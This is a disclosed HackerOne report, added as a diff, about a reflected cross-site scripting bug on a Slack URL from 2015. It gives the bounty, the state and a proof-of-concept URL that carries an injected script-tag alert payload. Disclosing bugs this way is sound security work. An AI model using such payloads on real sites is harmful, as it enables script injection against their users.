@@ -1,0 +1,14 @@
+ReportLink:https://hackerone.com/reports/2497
+WeaknessName:Cross-site Scripting (XSS) - Generic
+Reporter:https://hackerone.com/shahmeer-amir
+ReportedTo:Slack(slack)
+BountyAmount:150.0
+Severity:
+State:Closed
+DateOfDisclosure:15.03.2015 3:32:00
+
+Summary:
+
+https://slack.com/go/2-2190974613-d56827?77d50"><script>alert(9)</script>
+
+The following URL is vulnerable to XSS and can be reproduce in IE
